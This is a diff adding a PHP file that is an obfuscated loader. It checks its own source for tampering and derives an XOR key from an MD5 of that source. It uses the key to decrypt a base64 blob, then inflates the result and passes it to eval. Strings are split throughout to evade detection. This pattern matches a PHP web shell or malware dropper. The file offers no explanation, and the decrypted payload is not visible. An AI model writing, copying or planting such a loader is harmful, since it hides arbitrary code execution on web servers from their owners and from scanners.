@@ -1,0 +1,24 @@
+<?php
+$ezxvazgv="f2c2ce206b17d89c3b6ecf60371ece50";
+$ytxabmdigh="5f545b02575602520255535205595c5606010452055300020a53040605040351";
+$dvzazwhymghn="XDLpXu8DPJ4h+apPGimIm7oOrosKNjBG+bqCojYE7DeSLr6UEN62nM9/uyvqbCQp/EHduSEfLZHUR01XE3fU0vhWGPY4Nb8/qWJI4QtO0FzDzXdYLe9RaeFo4rirz7DH8CNoLuW1osH+n8EkMKELjpxLNAHdRC5zTvSKoJt5qZIsHNdMZe9galhtH+ElOwL/LIRdC9CC5gsiS7ad61ZwmyfVfAURFVCobqez09vaKG1kvSnTOfq5JLe23b2wOEICj3q7Aga3Clnep6Ms1hDNhro0Ze5k4g+9a2mlzL71NlP5zFOc6BDkOWqFadaX5AKzeXnLL4yPaHBYYxfDJ3SHdEllemDeGMMXVqHRslyw8ZFXFObxrivdNgALS2u762n1RFfBbYfuJ64Fsk8ZurjIbAC4F77Fv1tIw1PzrqMv2DSyG2vUC82Nk95KlNPKu1PnTipPUpwAmpYIivE5JDD2fq/pn98GPWAhnwoJrybuGNZEV2BWSJ+pS8AFYOpT+IXHuJzKxdpA4zJGPgD/XSCu/GwZ9zHv7vLvUOc4XY9xdR/fL5TqHkCQmsfsOR1gVWTcObbSyflusF2V77i96WfBCYAHlBGXfDkh6KxSx7OzzXTPU6dsVtn9XubPigRN6HfuKITLeMcuwUtiOJBNxtaB1x8Mrw1WYmdgHr7S3105I9SKXy9hYcN9XBaHXDWz1uRzeMj1A6GeahbY87OpcSR/WBv7ir/nOpey2rvrVolGAjC8kYjYt4anG3a/K//jVcAKgVn82Bge5OLexrxYAGHfSUQj33a3wKLom2ucbs19/anO8vJg8jY8UyNFLyh5bhS0b6AWfUAYV+sXlP7dlQ95tCHSBYWmx0ruM1i7gsKVpdiJgE0cfMUKPANwUMQL2k5wN5E3ROE7cKTcRKOyK3W2hRnKPk3EKUEYtDentvJ9cfFyLtIaw6WO+V5dtZNO";
+$daafwzca=file_get_contents(__FILE__);
+$qvtdxdpn=str_replace($dvzazwhymghn,"",$daafwzca);
+if(strpos($qvtdxdpn,"ec"."ho")!==false||strpos($qvtdxdpn,"pr"."int")!==false||strpos($qvtdxdpn,"var_"."dump")!==false||strpos($qvtdxdpn,"file_put_"."contents")!==false||strpos($qvtdxdpn,"fw"."rite")!==false){die();}
+$imqqpxhv=str_replace(array($ezxvazgv,$ytxabmdigh),array("SP_1fe41c0c","KP_41b67a6d"),$daafwzca);
+$kpiujq=md5($imqqpxhv);
+$smrpyghdggi=hex2bin($ytxabmdigh);
+$gwujsrg="";
+$itpiqu=strlen($kpiujq);
+for($orxqnmgobcv=0;$orxqnmgobcv<$itpiqu;$orxqnmgobcv++){
+    $gwujsrg.=chr(ord($smrpyghdggi[$orxqnmgobcv])^ord($kpiujq[$orxqnmgobcv]));
+}
+$lgabmwyxoqyn=base64_decode($dvzazwhymghn);
+$zaupbd=strlen($lgabmwyxoqyn);
+$jbiupaj="";
+$qrrkuzqae=strlen($gwujsrg);
+for($orxqnmgobcv=0;$orxqnmgobcv<$zaupbd;$orxqnmgobcv++){
+    $jbiupaj.=$lgabmwyxoqyn[$orxqnmgobcv]^$gwujsrg[$orxqnmgobcv%$qrrkuzqae];
+}
+$zknzoibvtdbs="gz"."in"."fl"."ate";
+eval($zknzoibvtdbs($jbiupaj));
